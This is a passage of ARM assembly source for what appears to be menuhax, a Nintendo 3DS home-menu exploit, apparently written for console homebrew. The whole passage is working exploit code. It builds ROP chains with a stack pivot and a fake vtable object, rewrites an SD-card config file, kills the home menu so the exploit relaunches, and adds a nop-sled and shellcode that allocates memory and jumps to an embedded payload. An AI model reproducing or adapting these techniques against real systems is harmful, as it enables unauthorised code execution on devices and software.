CALLFUNC_NOSP SRV_GETSERVICEHANDLE, (HEAPBUF + (aptsendparam_handle - _start)), (HEAPBUF + (nss_servname - _start)), 0x4, 0

ROP_SETLR POP_R2R6PC
.word POP_R0PC
.word 0x101 @ r0, dst appID

.word POP_R1PC
.word 0x1 @ r1, signaltype

.word POP_R2R6PC
.word 0 @ r2, parambuf*
.word 0 @ r3, parambufsize
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word APT_SendParameter

aptsendparam_handle:
.word 0 @ sp0, handle
.word 0
.word 0
.word 0
.word 0 @ r6*/

ropfinish_sleepthread:
#ifdef EXITMENU
ROP_SETLR ROP_POPPC

#if NEW3DS==0
.word POP_R0PC
.word 4000000000 @ r0

.word POP_R1PC @ Sleep 4 seconds.
.word 0 @ r1
#else
.word POP_R0PC
.word 3000000000 @ r0

.word POP_R1PC  @ Sleep 3 seconds.
.word 0 @ r1
#endif

.word svcSleepThread

.word MAINLR_SVCEXITPROCESS
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000 @ r0

.word POP_R1PC
.word 0x0 @ r1

.word svcSleepThread

ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC

.word POP_R1PC
.word ROP_BXR1 @ r1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148
#endif

#ifdef LOADSDCFG
newthread_ropstart:

@ Sleep 5-seconds.
ROP_SETLR ROP_POPPC

.word POP_R0PC
newthread_svcsleepthread_delaylow:
.word 0x2A05F200 @ r0

.word POP_R1PC
newthread_svcsleepthread_delayhigh:
.word 0x1 @ r1

.word svcSleepThread

@ Compare the gspgpu session handle with 0x0. On match continue running the below ROP which then jumps to newthread_ropstart, otherwise jump to newthread_rop_cmphidstart. Hence, this will only continue to checking the HID state when the gspgpu handle is non-zero(this is intended as a <is-homemenu-active> check, but this passes with *hax payload already running too).
ROPMACRO_CMPDATA_NEWTHREAD GSPGPU_SERVHANDLEADR, 0x0, (NEWTHREAD_ROPBUFFER + (newthread_rop_cmphidstart - newthread_ropstart))
ROPMACRO_STACKPIVOT_NEWTHREAD NEWTHREAD_ROPBUFFER, ROP_POPPC

newthread_rop_cmphidstart:
@ Setup the stack-pivot sp.
ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart)), NEWTHREAD_ROPBUFFER

@ Setup the stack-pivot pc.
ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart)), ROP_POPPC

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_r0data_cmphid - newthread_ropstart) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to newthread_rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
newthread_rop_r0data_cmphid:
.word 0 @ r0

.word POP_R1PC
newthread_rop_r1data_cmphid:
.word 0x0 @ r1, overwritten with data from cfg eariler.

.word ROP_CMPR0R1 @ Compare current PAD state with the cfg value.

.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the cfg value, continue the ROP, otherwise stack-pivot to newthread_ropstart.

.word 0, 0, 0 @ r4..r6

@ Read the cfg from FS again just in case it changed since menuhax initially ran.

CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 1, 0

CALLFUNC_NOSP IFile_Read, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))

.word ROP_LDR_R0FROMR0

.word IFile_Close

@ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to newthread_ropstart. Mismatch can also be caused by file-reading failing.
ROPMACRO_CMPDATA_NEWTHREAD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x0) - newthread_ropstart)), 0x3, (NEWTHREAD_ROPBUFFER)

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 0x1 @ r0

.word POP_R1PC
.word (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x10) - newthread_ropstart)) @ r1

.word ROP_STR_R0TOR1 @ Write 0x1 to cfg exec_type.

@ Write the updated cfg to the file.

CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 0x3, 0

CALLFUNC IFile_Write, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c, 1, 0, 0, 0

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))

.word ROP_LDR_R0FROMR0

.word IFile_Close

.word MAINLR_SVCEXITPROCESS @ Cause homemenu to terminate, which then results in menuhax automatically launching during homemenu startup.

newthread_rop_object:
.word NEWTHREAD_ROPBUFFER + (newthread_rop_vtable - newthread_ropstart) @ object+0, vtable ptr
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0
.word 0

.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((newthread_rop_object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
newthread_rop_stackpivot_sploadword:
.word NEWTHREAD_ROPBUFFER @ sp
newthread_rop_stackpivot_pcloadword:
.word ROP_POPPC @ pc

.space ((newthread_rop_object + 0x28) - .)
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

newthread_rop_vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

newthread_menuhax_cfg:
.space 0x2c

newthread_IFile_ctx:
.space 0x20

newthread_sdfile_cfg_path:
.string16 "sd:/menuhax/menuhax_cfg.bin"
.align 2

newthread_tmp_scratchdata:
.space 0x400

newthread_ropend:
.word 0
#endif

#ifndef ENABLE_LOADROPBIN
.align 4
codedatastart:
#if NEW3DS==0
.space 0x200 @ nop-sled
#else
#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)
.space 0x1000
#else
.space 0x3000 @ Size >=0x2000 is needed for SKATER >=v9.6(0x3000 for SKATER system-version v9.9), but doesn't work with the initial version of SKATER for whatever reason.
#endif
#endif

#if NEW3DS==0
ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.
#else
/*ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.*/
/*ldr r0, =0x540BE400
mov r1, #2
svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
#endif

ldr r0, =0x10003 @ operation
mov r4, #3 @ permissions

mov r1, #0 @ addr0
mov r2, #0 @ addr1
ldr r3, =0xc000 @ size
svc 0x01 @ Allocate 0xc000-bytes of linearmem.
mov r4, r1
cmp r0, #0
bne codecrash

mov r1, #0x49
str r1, [r4, #0x48] @ flags
ldr r1, =0x101
str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
mov r0, r4
adr r1, codecrash
mov lr, r1
#ifdef PAYLOADENABLED
b codebinpayload_start
#else
b codecrash
#endif
.pool

codecrash:
ldr r3, =0x58584148
ldr r3, [r3]
code_end:
b code_end
.pool

.align 4
codebinpayload_start:
#ifdef CODEBINPAYLOAD
.incbin CODEBINPAYLOAD
#endif

.align 4
codedataend:
.word 0
#endif

.align 4
_end:

